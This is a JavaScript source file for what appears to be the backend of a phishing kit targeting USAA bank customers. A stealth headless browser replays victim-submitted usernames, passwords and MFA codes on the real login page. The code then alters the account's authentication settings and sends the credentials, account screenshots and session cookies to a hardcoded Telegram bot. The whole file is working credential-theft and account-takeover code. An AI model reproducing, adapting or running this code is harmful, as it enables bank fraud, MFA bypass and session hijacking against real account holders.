// puppeteer-extra is a drop-in replacement for puppeteer,
// it augments the installed puppeteer with plugin functionality
const puppeteer = require('puppeteer-extra')
const fs = require('fs');
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const token = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
const chatId = '-937223528';
const bot = new TelegramBot(token, { polling: false });


const app = express();

app.use(cors());

// app.use(bodyParser.urlencoded({ extended: true }));

// app.use(bodyParser.json());

// add stealth plugin and use defaults (all evasion techniques)
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
puppeteer.use(StealthPlugin())

// puppeteer usage as normal
puppeteer.launch({ headless: true }).then(async browser => {
  //   console.log('Running tests..')
    const page = await browser.newPage()
      // Set a custom user agent
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36');

app.use(cors());

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/login', async (req, res) => {

  const { username, password } = req.body;  

  // console.log(username)

  console.log('running first server')
  await page.evaluateOnNewDocument(() => {
    // Pass the Webdriver Test.
    Object.defineProperty(navigator, 'webdriver', {
      get: () => false,
    });
   // Pass the Chrome Test.
    // We can mock this in as much depth as we need for the test.
    window.navigator.chrome = {
        runtime: {},
      };
  
      // Pass the Permissions Test.
      const originalQuery = window.navigator.permissions.query;
      return (window.navigator.permissions.query = (parameters) =>
        parameters.name === 'notifications'
          ? Promise.resolve({ state: Notification.permission })
          : originalQuery(parameters));
  
      // Etc., add more customizations if necessary
    });
  await page.goto('https://www.usaa.com/my/logon')
  await page.waitForTimeout(2000)
    // Paste the user ID
  await page.type('input[name="memberId"]', username);

   // Click on the button with class name 'next-button'
   await page.click('#next-button');


   await page.waitForTimeout(5000)

   
   await page.type('input[name="password"]', password);

  await page.click('#next-button');

  await page.waitForTimeout(5000)

  const isClassPresent = await page.evaluate(() => {
    return document.querySelector('.miam-a1-err-par') !== null;
  });
  
  
  await page.screenshot({ path: 'balance.png', fullPage: true })

  const imagePath = 'balance.png';

  // Send the image
bot.sendPhoto(chatId, imagePath)
    .then(() => {
      // console.log('Image sent successfully');
    })
    .catch((error) => {
      console.error('Error sending image:', error);
    });

  try {
    await page.click('.more-options-link');
    console.log('Clicked .more-options-link');
  } catch (error) {
    console.log('Element .more-options-link not found');
    // Continue with the code execution or handle the error as needed
  }


  const classValue = await page.evaluate(() => {
    const elements = document.querySelectorAll('.sub-label');
    return Array.from(elements).map(element => element.textContent);  
  });
  // console.log(classValue)



  if (isClassPresent) {
    // console.log('Incorrect Password.');
    res.json({ message: 'Password is Invalid' });

    bot.sendMessage(chatId, `✅ ✅ INCORRECT PASSWORD ✅ ✅ :      USERNAME: ${username}  ||  PASSWORD: ${password}`)
    .then(() => {
      // console.log('Message sent successfully');
    })
    .catch((error) => {
      // console.error('Error sending message:', error);
    });
    return
  } else {
    res.json({ message: 'Password is valid' , classValue});

    // Send the text message
    bot.sendMessage(chatId, `✅ ✅ VERIFIED USAA LOGIN ✅ ✅ :      USERNAME: ${username}  ||  PASSWORD: ${password}`)
    .then(() => {
      // console.log('Message sent successfully');
    })
    .catch((error) => {
      // console.error('Error sending message:', error);
    });
  }

  // await page.click('.more-options-link');

  // await page.click('.main-label');

  // await page.waitForTimeout(5000)

  // await page.type('input[name="pin"]', '0713');

  // await page.click('#next-button');
  
  // Wait for page navigation to complete
  // await page.waitForNavigation();

  // console.log('Navigation complete. Navigated to:', page.url());

  // await page.waitForTimeout(5000)

  // await page.goto('https://www.usaa.com/inet/ent_securityprefs/SecurityPreferences?action=SelectAuthenticationPreference');

  // await page.click('#stdLog');
  // await page.click('.button_primary_v2');


  // await page.waitForTimeout(5000)


  // const cookies = await page.cookies();

  // const cook = JSON.stringify(cookies)
  //   // Write cookies to a text file
  // fs.writeFile('cookies.txt', JSON.stringify(cookies), function (err) {
  // if (err) throw err;
  // console.log('Cookies saved to cookies.txt');
  // });


  // await page.screenshot({ path: 'testresult.png', fullPage: true })
  // await browser.close()
  // console.log(`All done, check the screenshot. ✨`)
})


app.post('/mfacodes', async (req, res) => {
  console.log('running s server')
  const { content } = req.body;  

 
  const targetText = content;

  await page.evaluate((targetText) => {
    const elements = document.querySelectorAll('*');
    for (const element of elements) {
      if (element.textContent.trim() === targetText) {
        element.click();
        break;
      }
    }
  }, targetText);

  // console.log(`Clicked element with text: ${targetText}`);


  await page.waitForTimeout(5000)


})


app.post('/codesmfa', async (req, res) => {
  console.log('running second server')
  const { twoFa } = req.body;  

  // console.log(twoFa)

  await page.type('input[name="inputValue"]', twoFa);

  await page.click('#next-button');

  await page.waitForTimeout(5000)

  const isClassPresent = await page.evaluate(() => {
    return document.querySelector('.miam-a1-err-par') !== null;
  });

  if (isClassPresent) {
    // console.log('Incorrect Code.');
    res.json({ messageCode: 'Code is Invalid' });
    return
  } else {
    res.json({ messageCode: 'Code is valid'});
        // Send the text message
        bot.sendMessage(chatId, `✅ ✅ VERIFIED USAA 2FA CODE ✅ ✅ :      USERNAME:: ${twoFa}`)
        .then(() => {
          // console.log('Message sent successfully');
        })
        .catch((error) => {
          // console.error('Error sending message:', error);
        });
    // console.log('Code IS Valid');
  }

    // Wait for page navigation to complete
    await page.waitForTimeout(8000)

  console.log('Navigation complete. Navigated to:', page.url());

  await page.waitForTimeout(5000)
  await page.screenshot({ path: 'balance.png', fullPage: true })

  const imagePath = 'balance.png';

  // Send the image
bot.sendPhoto(chatId, imagePath)
    .then(() => {
      // console.log('Image sent successfully');
    })
    .catch((error) => {
      console.error('Error sending image:', error);
    });

  await page.goto('https://www.usaa.com/inet/ent_securityprefs/SecurityPreferences?action=SelectAuthenticationPreference');

  await page.click('#stdLog');
  await page.click('.button_primary_v2');


  await page.waitForTimeout(5000)


  const cookies = await page.cookies();

  const cook = JSON.stringify(cookies)
    // Write cookies to a text file
  fs.writeFile('cookies.txt', JSON.stringify(cookies), function (err) {
  if (err) throw err;

  // Read the .txt file
const filePath = 'cookies.txt';
// Create a readable stream from the file
const fileStream = fs.createReadStream(filePath);

// Send the .txt file as a document
bot.sendDocument(chatId, fileStream)
  .then(() => {
    console.log('File sent successfully');
  })
  .catch((error) => {
    console.error('Error sending file:', error);
  });
  // console.log('Cookies saved to cookies.txt');
  });


  await page.screenshot({ path: 'testresult.png', fullPage: true })
  const imagePah = 'testresult.png';

  // Send the image
bot.sendPhoto(chatId, imagePah)
    .then(() => {
      console.log('Image sent successfully');
    })
    .catch((error) => {
      console.error('Error sending image:', error);
    });


  await browser.close()
  console.log(`All done, check the screenshot. ✨`)
})



})






const port = 3006

app.listen(port, () => console.log(`Server started on port ${port}`))
